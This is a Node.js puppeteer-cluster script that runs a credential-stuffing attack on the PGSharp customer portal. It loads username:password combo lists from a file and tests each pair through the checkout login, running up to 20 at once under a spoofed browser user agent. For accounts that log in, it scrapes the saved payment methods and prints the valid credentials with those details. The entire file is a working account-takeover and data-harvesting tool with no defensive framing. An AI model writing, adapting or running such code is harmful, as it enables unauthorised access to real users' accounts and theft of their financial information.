const { Cluster } = require('puppeteer-cluster');
const puppeteer = require("puppeteer");
const lineReader = require('line-reader');
const path = require('path');

async function main() {
    const cluster = await Cluster.launch({
        concurrency: Cluster.CONCURRENCY_CONTEXT,
        maxConcurrency: 20,
        timeout: 360000
    });

    await cluster.task(async ({ page, data: account }) => {
        let username = account.username;
        let password = account.password;
        await page.setUserAgent('Mozilla/5.0 (Nintendo Switch; WebApplet) AppleWebKit/606.4 (KHTML, like Gecko) NF/6.0.1.16.10 NintendoBrowser/5.1.0.20923');
        await page.goto('https://manage.pgsharp.com/cart.php?a=confproduct&i=0', { timeout: 0 });
        await page.click('#product1-order-button');
        await page.waitForSelector('#btnCompleteProductConfig', { timeout: 0 });
        await page.click('#btnCompleteProductConfig');
        await page.waitForTimeout(2000);
        await page.goto('https://manage.pgsharp.com/cart.php?a=view', { timeout: 0 });
        await page.click('#checkout');
        await page.waitForSelector('#btnAlreadyRegistered', { timeout: 0 });
        await page.waitForTimeout(5000);
        await page.click('#btnAlreadyRegistered', { delay: 500 });
        await page.waitForTimeout(1000);
        await page.type('#inputLoginEmail', username);
        await page.type('#inputLoginPassword', password);
        await page.waitForSelector('#paymentGatewaysContainer div div', { timeout: 0 });
        let option = await page.$$("#paymentGatewaysContainer div div");
        await option[8].click();
        await page.click('#btnCompleteOrder');
        await page.waitForSelector(".alert.alert-danger.checkout-error-feedback", { timeout: 0 });
        let box = await page.$(".alert.alert-danger.checkout-error-feedback");
        let source = await page.evaluate(el => el.textContent, box);
        if (source.includes("Login Details Incorrect. Please try again.") || source.includes("Login Details Incorrect. Please try again.")) {
            process({ username: username, password: password, success: false, error: "Login Details Invalid" });
            return;
        }
        if (source.includes("You did not enter your email address") || source.includes("You did not enter a password")) {
            process({ username: username, password: password, success: false, error: "Slow Connection Error. Retry" });
            return;
        }
        await page.goto("https://manage.pgsharp.com/index.php?rp=/account/paymentmethods", { timeout: 0 });
        await page.waitForSelector("p", { timeout: 0 });
        let text = await page.$("p");
        let value = await page.evaluate(el => el.textContent, text);
        if (!value.includes("An overview of your payment methods and settings.")) {
            process({ username: username, password: password, success: false, error: "Payment Method Unavailable" });
            return;
        }
        let data = await page.$$eval('#payMethodList tbody tr td', tds => tds.map((td) => {
            return td.innerText;
        }));
        let paymentList = splitArrayIntoChunksOfLen(data, 5);
        for (let j = 0; j < paymentList.length; j++) {
            paymentList[j] = paymentList[j][1];
        };
        process({ username: username, password: password, success: true, paymentMethods: paymentList });
        return;
    });

    let dump = [];
    let valids = [];
    let combos = [];

    lineReader.eachLine('main.txt', (line, last) => {
        if(line.split(" ").length == 1){
            if(line.split(":").length == 2){
                dump.push({username: line.split(":")[0], password: line.split(":")[1]});
                cluster.queue(dump[dump.length - 1]);
            }
        }
        if(last){
            return false;
        }
    });

    function splitArrayIntoChunksOfLen(arr, len) {
        let chunks = [];
        let i = 0;
        let n = arr.length;
        while (i < n) {
          chunks.push(arr.slice(i, i += len));
        }
        return chunks;
      }

    async function process(combo) {
        if(combo.error == "Slow Connection Error. Retry"){
            await cluster.queue(combo);
        }
        if(combo.success){
            valids.push(combo);
        }
        combos.push(combo);
        logStatus();
    }

    function logStatus(){
        console.clear();
        console.log("Valid: " + valids.length);
        console.log("Invalids: " + (combos.length - valids.length));
        for(let x=0; x<valids.length; x++){
            console.log(valids[x]);
        }
    }

    logStatus();

    cluster.on('taskerror', (err, data, willRetry) => {
        if (willRetry) {
          console.warn(`Encountered an error while crawling ${data}. ${err.message}\nThis job will be retried`);
        } else {
          console.error(`Failed to crawl ${data}: ${err.message}`);
        }
    })

    await cluster.idle();
    await cluster.close();
}

main();